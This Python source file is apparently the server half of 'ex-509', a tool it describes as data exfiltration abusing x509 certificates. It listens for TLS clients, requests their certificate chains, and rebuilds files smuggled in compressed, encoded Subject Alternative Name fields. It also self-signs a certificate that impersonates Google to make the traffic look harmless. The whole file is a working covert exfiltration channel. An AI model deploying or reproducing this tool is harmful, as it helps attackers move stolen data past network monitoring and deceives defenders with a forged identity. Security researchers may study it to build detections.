import argparse
import base64
import lib.spinner
import lzma
import OpenSSL
import os
import random
import signal
import socket
import sys
import tlslite


def parse_args():
	p = argparse.ArgumentParser(description="Data exfiltration abusing x509 certificates")

	p.add_argument(
		"-c",
		"--cert",
		type=str,
		help="server certificate to use during the TLS handshake"
	)

	p.add_argument(
		"-k",
		"--key",
		type=str,
		help="private key (if not included in the certificate file)"
	)

	p.add_argument(
		"-p",
		"--port",
		type=int,
		default=1337,
		help="port to listen on"
	)

	p.add_argument(
		"-v",
		"--version",
		help="print the program version",
		action="store_true"
	)

	return p.parse_args()


def generate_cert(output):
	cert = OpenSSL.crypto.X509()

	# Set the certificate's subject (and issuer since it's self-signed)
	subject = cert.get_subject()
	subject.countryName = "US"
	subject.stateOrProvinceName = "California"
	subject.localityName = "Mountain View"
	subject.organizationName = "Google LLC"
	subject.commonName = "www.google.com"

	# Set random serial number and validity period of 1 year
	cert.set_serial_number(random.randint(1000000000, 9999999999))
	cert.gmtime_adj_notBefore(0)
	cert.gmtime_adj_notAfter(60 * 60 * 24 * 7 * 4 * 12)

	# Generate a 4096 bit RSA key pair
	key = OpenSSL.crypto.PKey()
	key.generate_key(OpenSSL.crypto.TYPE_RSA, 4096)

	# Self sign the certificate
	cert.set_issuer(subject)
	cert.set_pubkey(key)
	cert.sign(key, "sha512")

	# Output the certificate and private key
	with open(output, "wb") as f:
		f.write(OpenSSL.crypto.dump_certificate(OpenSSL.crypto.FILETYPE_PEM, cert))
		f.write(OpenSSL.crypto.dump_privatekey(OpenSSL.crypto.FILETYPE_PEM, key))


# Keep track of our sockets make sure they're closed before exiting
sock_list = []
def signal_handler(sig, frame):
	print("\n[*] Performing Cleanup")

	for s in sock_list:
		try:
			s.close()
		except Exception:
			pass

	print("[*] Done")
	sys.exit(0)


def handle_args(args):
	if args.version:
		print("ex-509 v1.0\nWritten by Adeem Mawani")
		sys.exit(0)

	# Generate a self-signed cert if none was provided
	if not args.cert:
		path = os.path.join(os.getcwd(), "self-signed.pem")
		if not os.path.isfile(path):
			generate_cert(path)
		args.cert = path

	# Assume private key is in the certificate if no key was given
	if not args.key:
		args.key = args.cert


if __name__ == "__main__":
	signal.signal(signal.SIGINT, signal_handler)
	arg = parse_args()
	handle_args(arg)

	# Determine the type of certificate and parse the file into an X509CertChain object
	x509 = tlslite.X509()
	if os.path.splitext(arg.cert)[1].lower() == ".pem":
		with open(arg.cert, "r") as s:
			x509.parse(s.read())
	else:
		with open(arg.cert, "rb") as b:
			x509.parseBinary(b.read())
	certChain = tlslite.X509CertChain([x509])

	# Parse the private key file
	with open(arg.key, "r") as s:
		privateKey = tlslite.parsePEMKey(s.read(), private=True)

	# Listen for client connections
	sock = socket.socket()
	sock.bind(("", arg.port))
	sock.listen()
	sock_list.append(sock)

	while True:
		with lib.spinner.Spinner(" Listening on port {}".format(arg.port)):
			client, addr = sock.accept()
			sock_list.append(client)

		print("[*] Client connected: {}:{}".format(addr[0], addr[1]))

		# Checker object to always reject the client's certificate (compares fingerprint to 0)
		# Inner try block to catch the auth exception thrown by the library
		try:
			try:
				checker = tlslite.Checker(x509Fingerprint="0")
				conn = tlslite.TLSConnection(client)
				conn.handshakeServer(certChain=certChain, privateKey=privateKey, reqCert=True, checker=checker)
			except tlslite.TLSFingerprintError:
				pass

			# Stores all the decoded bytes of the file
			file_bytes = bytearray()
			file_name = str(conn.session.clientCertChain.getFingerprint())

			# The first certificate has an additional "DNS:" entry with the file extension, so we load it separately
			first_cert = conn.session.clientCertChain.x509List.pop(0)
			first_parsed = OpenSSL.crypto.load_certificate(OpenSSL.crypto.FILETYPE_ASN1, bytes(first_cert.bytes))
			first_ext_data = first_parsed.get_extension(0).get_data()

			# Get the file extension and use cert fingerprint as the filename
			first_slice = first_ext_data.find(b".")
			second_slice = first_ext_data.find(b"DNS:")
			file_ext = first_ext_data[first_slice:second_slice].decode("utf-8")

			# Append the file bytes from the rest of the certificate (ignoring the next "DNS:" prefix)
			file_bytes.extend(lzma.decompress(base64.b64decode(first_ext_data[(second_slice + 4):])))

			# Parse the remaining certificates in the client's certificate chain
			for cert in conn.session.clientCertChain.x509List:
				parsed_cert = OpenSSL.crypto.load_certificate(OpenSSL.crypto.FILETYPE_ASN1, bytes(cert.bytes))

				# Decode the data in the SAN extension (ignoring the first few bytes)
				data = parsed_cert.get_extension(0).get_data()
				decoded = base64.b64decode(data[7:])
				decompressed = lzma.decompress(decoded)
				file_bytes.extend(decompressed)

			print("[*] Received {} File\n".format(file_ext))

			# Output the received file
			path = os.path.join(os.getcwd(), file_name + file_ext)
			with open(path, "wb") as f:
				f.write(file_bytes)

			# Cleanup and repeat
			client.close()
			sock_list.remove(client)

		except Exception as e:
			print("[!] {0}".format(e))
			os.kill(os.getpid(), signal.SIGINT)
